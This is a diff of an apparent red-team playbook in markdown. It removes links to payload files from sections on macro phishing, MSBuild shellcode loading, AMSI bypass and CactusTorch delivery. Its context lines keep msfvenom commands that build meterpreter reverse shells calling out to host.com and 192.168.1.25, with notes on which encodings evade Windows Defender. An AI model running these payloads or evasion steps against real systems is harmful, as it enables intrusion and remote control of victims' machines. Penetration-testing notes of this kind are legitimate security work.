@@ -31,13 +31,11 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 
 * Phishing
 	* <details><summary>Excel (Click to expand)</summary><p>
-		* [Example 1](Testaments_and_Books/Redvelations/Windows/Payloads/VBA1.vba)
 			* Features
 				* Execute upon macro enabling
 			* Lines to Modify
 				* Modify backwards URL to point to your infrastructure
 	* <details><summary>Word (Click to expand)</summary><p>
-		* [Example 1](Testaments_and_Books/Redvelations/Windows/Payloads/VBA2.vba)
 			* Modify the infrastructure position to your infrastructure URL
 * MSBuild
 	* <details><summary>Initial Requirements (Click to expand)</summary><p>
@@ -65,7 +63,6 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 				* Currently NOT working on Symantec
 				* Currently not working on Defender.
 		1. Insert shellcode into shell of XML file shell:
-			* [MSBuild XML Shell SubTee](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_SubTee.xml)
 		1. Execute
 
 				C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shellcode.xml
@@ -79,7 +76,6 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 					msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=host.com -f raw -a x86 > payload.raw
 					cat payload.raw | base64
 			1. Insert into MSBuild Template
-				* [XML Shell vector-sec](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_vector-sec.xml)
 	* <details><summary>dxflatline's method (with GZip) (Click to expand)</summary><p>
 		* References
 			[https://gist.github.com/dxflatline/99de0da360a13c565a00a1b07b34f5d1#file-msbuild_sc_alloc-csproj](https://gist.github.com/dxflatline/99de0da360a13c565a00a1b07b34f5d1#file-msbuild_sc_alloc-csproj)
@@ -94,14 +90,11 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 						msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=54321 --encoder x86/xor_dynamic -f raw 2>/dev/null | gzip | base64 -w 0
 					* Currently bypasses Windows Defender
 			1. Insert into xml Shell
-				* [MSBuild XML Shell dxflatline](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_dxflatline.xml)
 	* <details><summary>Joel and Kerry's Method (Gzip + XOR) (Click to expand)</summary><p>
-		* [MSBuild XML Shell Joel & Kerry](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_Joel_and_Kerry.xml)
 	* <details><summary>64-bit MSBuild + (64-bit Shellcode) (Click to expand)</summary><p>
 		* Notes
 			* The main difference between this and the standard 32-bit version (besides the shellcode) is the replacement of all instances of **UInt32** with **UInt64**
 		* Template
-			* [MSBuild XML Shell 64-bit](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_64-bit.xml)
 			* [MSBuild 64-bit C Code](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_64-Bit.c)
 	* <details><summary>Generate payload and format XOR key for C-sharp (Click to expand)</summary><p>
 		* <details><summary>Options (Click to expand)</summary><p>
@@ -158,7 +151,6 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 						Set objUserEnvVars = CreateObject("WScript.Shell").Environment("User")
 						objUserEnvVars.item("MSBUILDENABLEALLPROPERTYFUNCTIONS") = "1"
 				* In order for this to work, you need to find a C# file (try to target a signed Microsoft File), to a directory and then output a file below with `BinaryName.exe.config`. Then when you execute `BinaryName.exe`, it should call the code below.
-					* [XML](Testaments_and_Books/Redvelations/Windows/Payloads/config-file-lolbin.xml)
 	* <details><summary>Potential Alternatives to MSBuild (Click to expand)</summary><p>
 		* SAVE until MSBuild no longer viable.
 			* [https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/](https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/)
@@ -175,9 +167,6 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 		* <details><summary>References (Click to expand)</summary><p>
 			* [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
 		* <details><summary>Process (Click to expand)</summary><p>
-			Removed by Black Lantern Security on 2026-10-23: third-party Bypass-AMSI wrapper and one-liner by Andre Marques (0x00-0x00),
-			no license found. Obtain it from the reference above. See THIRD_PARTY_NOTICES.md.
-			* [Source code](Testaments_and_Books/Redvelations/Windows/Payloads/PowerShell_AMSI_Bypass.cs)
 * <details><summary>Powershell Download & Execute (Click to expand)</summary><p>
 	* Executable:
 
@@ -235,11 +224,8 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 * <details><summary>Using XSL + CactusTorch (Click to expand)</summary><p>
 	* <details><summary>Process (Click to expand)</summary><p>
 		1. Download the .js CactusTorch .js payload - <br />[https://github.com/mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
-			* Local Copy [CactusTorch.js Payload](Testaments_and_Books/Redvelations/Windows/Payloads/CactusTorch.js)
 		1. Run CactusTorch
 			* Example Output (Help Output)
-					Removed by Black Lantern Security on 2026-10-23: third-party CACTUSTORCH help banner by Vincent Yiu (@vysecurity),
-					no license found. Obtain it from https://github.com/vysecurity/CACTUSTORCH. See THIRD_PARTY_NOTICES.md.
 
 		1. Generate a payload, encode in base64
 			* msfvenom
